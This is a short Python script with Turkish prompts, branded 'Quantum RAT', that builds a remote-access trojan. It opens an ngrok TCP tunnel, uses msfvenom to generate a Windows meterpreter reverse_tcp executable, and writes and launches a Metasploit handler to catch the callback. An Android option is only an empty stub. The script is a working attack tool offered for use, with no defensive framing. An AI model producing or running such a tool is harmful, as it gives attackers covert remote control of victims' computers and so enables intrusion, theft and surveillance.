import os
from time import sleep

os.system("sudo apt install figlet")
os.system("sudo apt install lolcat")
os.system("sudo apt install gnome-terminal")
os.system("clear")
os.system("figlet -c 'Quantum RAT' | lolcat --animate --speed 10.0")
os.system("echo '~ Welcome The Quantum ~' | lolcat")

tcpPort = input("TCP Portu: ")
os.system(f"gnome-terminal -- bash -c 'ngrok tcp {tcpPort}; exec bash'")
sleep(5)

system = input("İstenilen Sistem (Android, PC): ")
trojanHost = input("IP Adresi (Host): ")
trojanPort = int(input("Port: "))
trojanPath = input("Dosya Dizini (Path): ")

if system.lower() == "pc":
    os.system(f"msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows lhost={trojanHost} lport={trojanPort} -f exe -o {trojanPath} ")
    with open("./handler.rc", "w") as rcFile:
        rcFile.write(f"""
        use exploit/multi/handler
        set payload windows/meterpreter/reverse_tcp
        set LHOST 127.0.0.1
        set LPORT {tcpPort}
        exploit""")
    os.system(f"gnome-terminal -- bash -c 'msfconsole -r ./handler.rc; exec bash'")

elif system.lower() == "android":
    # Android
    pass